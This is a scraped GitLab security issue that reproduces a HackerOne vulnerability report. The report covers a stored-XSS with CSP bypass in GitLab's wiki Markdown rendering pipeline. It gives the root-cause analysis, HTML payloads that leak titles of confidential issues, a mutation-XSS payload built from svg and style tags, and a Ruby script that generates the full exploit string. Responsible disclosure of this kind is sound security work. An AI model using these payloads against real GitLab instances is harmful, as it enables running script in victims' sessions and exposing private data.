=== Content from hackerone.com_f0ae7e12_20250111_153729.html ===


It looks like your JavaScript is disabled. To use HackerOne, enable JavaScript in your browser and refresh this page.



=== Content from gitlab.com_8e3417e3_20250111_153728.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored-XSS injected in Wiki page via Banzai pipeline

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2257080](https://hackerone.com/reports/2257080)** by `yvvdwf` on 2023-11-19, assigned to [@ngeorge1](/ngeorge1 "Nikhil George"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

I found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.

### Reproduce

* Create a new project.
* Got to its `Wikis`, `Create your first page` button, then fill the form:
  + Title: `_sidear`
  + Content: please see in `_sidebar.md` attached file ([![_sidebar.md](data:image/gif;base64...)](https://user-content.gitlab-static.net/771ee57e8319b2d314187f9e8a6ba01fcd5b3cee/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61376132616466372d386538392d343232302d616232312d3639343033663962373731662f5f736964656261722e6d64))

[![0.sidebar.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d50298b51114d3b14bb886c9610de1a9e436333c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62656264643533632d663361312d343832322d613466352d3634613632343163626231612f302e736964656261722e706e67)

* click `Create page` to save the wiki page
* after the page is reloaded, you should see an alert which is caused by `alert(document.domain)`
* **Note:** you will not see the alert if you are the person who can access to the Gitlab confidential issue `https://gitlab.com/gitlab-org/gitlab/-/issues/428268` which is used to track one of my H1 report. (thus, you login using another account, can create a private issue, then replace the link above by your issue's link)

### Impact

Stored-XSS with CSP-bypass allows executing arbitrary javascript at the client side on behalf of victims including any RESTfull API.

### TL;DR

#### 1. `gsub`

The vulnerable code is as the following:

```
###  https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116
        def call
          ...
          link_pattern_start = /\A#{link_pattern}/
          ...
          nodes.each_with_index do |node, index|
            ...
            elsif element_node?(node)
              yield_valid_link(node) do |link, inner_html|
                ...
                if link == inner_html && inner_html =~ link_pattern_start
                  replace_link_node_with_text(node, index) do
                    object_link_filter(inner_html, link_pattern, link_reference: true)
                  end

###  https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182
       def object_link_filter(text, pattern, link_content: nil, link_reference: false)
          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|
            ...
            if object
              ...
              link = ...

###  https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38
    def references_in(text, pattern = object_class.reference_pattern)
          text.gsub(pattern) do |match|
            if ident = identifier($~)
              yield match, ident, $~[:project], $~[:namespace], $~
            else
              match
            end
          end
        end
```

I'm not sure for which reason `link_pattern_start` is used to check **only** the prefix of `link_pattern` (not the whole) in the first function of the listing above. And latter the `link_pattern` is used in `gsub` to replace **any** occurrences in the third function. Consider the following HTML snippet:

```
<a href="LINK_PATTERN<a alt='&quot;LINK_PATTERN'></a>">LINK_PATTERN<a alt='"LINK_PATTERN'></a></a>
```

The second replacement of `LINK_PATTERN` will expanse the corresponding information into `alt` attribute. This information will never be redacted as it tag `<a>` does not have `class = gfm`. This can be used to disclose titles of private [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

For example, open an issue with the following content (we need `<i>` tag to have nested `<a>` tags):

* input:

```
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='"https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i></a></dl>
```

* output: we can get the title of Gitlab's confidential issue 428268:

[![1.disclosure.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/a18fd8f5db632342cbba1522a3026c7fb79a8fc4/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33633433346433382d326437332d343765372d626464362d6266623233613233646133392f312e646973636c6f737572652e706e67)

#### 2. `&quot;`

Now if we replace single quot by double one, and add `href` attribute as the following:

```
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=&quot;//xxx&quot; alt=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot;></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href="//xxx" alt="https://gitlab.com/gitlab-org/gitlab/-/issues/428268"></a></i></a></dl>
```

We get the result:

[![2.breakdown.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/a66b1813b3040cd2b649593a5b55bf66c9b25630/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38333732303935622d303934622d346530642d616662622d6631656561636230326537632f322e627265616b646f776e2e706e67)

Because the second replacement of `LINK_PATTERN` broke down the double quotes of `alt` to introduce other attributes. The result was latter redacted by:

```
###  https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66
  def redacted_node_content(node)
      original_content = node.attr('data-original')
      original_content = CGI.escape_html(original_content) if original_content

      original_link =
        if node.attr('data-link-reference') == 'true'
          href = node.attr('href')

          %(<a href="#{href}">#{original_content}</a>)
        end

      original_link || original_content || node.inner_html
    end
```

This means that if we can inject `&quot;` in to the `href` attribute, then we can break it.

Fortunately, the [Sanitize](https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40) is here and it replaces `"` by `%22` in the `href` attribute.

```
###  https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40

  # Mapping of original characters to escape sequences for characters that
  # should be escaped in attributes affected by unsafe libxml2 behavior.
  UNSAFE_LIBXML_ESCAPE_CHARS = {
    ' ' => '%20',
    '"' => '%22'
  }
```

Any users' direct input of `href` is sanitized but not the `href` which are generated by other HTML filters. One of them is [GollumTagsFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/gollum_tags_filter.rb#L141).

If we provide the following input:

```
[[a|http:'"&lt;]]
```

then we get:

```
<a rel="nofollow noreferrer noopener" class="gfm" href="http:'&quot;&lt;" target="_blank">a</a>
```

So fare, we can introduce any attribute into `<a>` tag, or add arbitrary tag. The latter will have no attribute because no space between tag name and attribute (any space character is URI encoded when serializing `href`).

For example:

* input:

```
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'"yvvdwf=here&gt;&lt;img/src="0"onerror="alert(0)"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl>
```

* output:

```
<dl>&#x000A;<a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268">https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>*<i><a href="http:'" yvvdwf="here"><img></a><a>https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>" class="gfm"&gt;a</i>&#x000A;</dl>
```

#### 3. mXSS

The backend parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between tag name and the attribute. Howeverthe browser supports HTML5 which tolerate some additional characters, such as `/`.

For example, this snippet `<img/src="0"onerror="alert(0)">` will give different result:

* `<img>` at the backend [![nokogiri-html4.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/3332b242d7553c8fa1d4a4f5ad6ad0cb7ec1abd5/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31316561333561322d613035332d346665642d386665312d3130633663376133616665632f6e6f6b6f676972692d68746d6c342e706e67)
* `<img src="0" onerror="alert(0)">` at the browser

As we can inject any tag, we use `<style>` to keep inside the snippet which will be sent to browser as-is:

```
<style><img/src="0"onerror="alert(0)"></style>
```

Finally, to be able to get the `<img>` tag back, we put all of them inside `<svg>` tag:

```
<svg><style><img/src="0"onerror="alert(0)"></style></svg>
```

At the browser, the`<img>` tag is mutated to get outside of `<svg>` context. Thus we get the following result:

```
<svg><style></style></svg>
<img src="0" onerror="alert(0)">
```

Until here, we can inject any tag with any attribute. By using the basic payload `<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>` we can get XSS.

#### payload

This is a small Ruby snippet to generate the payload:

```
def gen_payload( payload, based_url: "https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
  payload    = "#{payload}#{based_url}" unless payload.include? based_url
  payload    = payload.gsub('<', '&lt;').gsub('>', '&gt;')

  es_payload = %(*<i><a href="http:#{ payload.gsub('"','&quot;') }" class="gfm">a</a></i>)
  es_payload = CGI.escape_html( es_payload ).gsub('%20', '%2520') #double encode space/tab/new_line

  a = %(<dl><a href="#{ based_url }#{ es_payload }">#{ based_url }*<i>[[a|http:#{ payload }]]</i></a></dl>)
  puts a
end

gen_payload %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>)
```

Best regards,

yvvdwf

#### Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [\_sidebar.md](https://h1.sec.gitlab.net/a/a7a2adf7-8e89-4220-ab21-69403f9b771f/_sidebar.md)
* [0.sidebar.png](https://h1.sec.gitlab.net/a/bebdd53c-f3a1-4822-a4f5-64a6241cbb1a/0.sidebar.png)
* [2.breakdown.png](https://h1.sec.gitlab.net/a/8372095b-094b-4e0d-afbb-f1eeacb02e7c/2.breakdown.png)
* [1.disclosure.png](https://h1.sec.gitlab.net/a/3c434d38-2d73-47e7-bdd6-bfb23a23da39/1.disclosure.png)
* [nokogiri-html4.png](https://h1.sec.gitlab.net/a/11ea35a2-a053-4fed-8fe1-10c6c7a3afec/nokogiri-html4.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


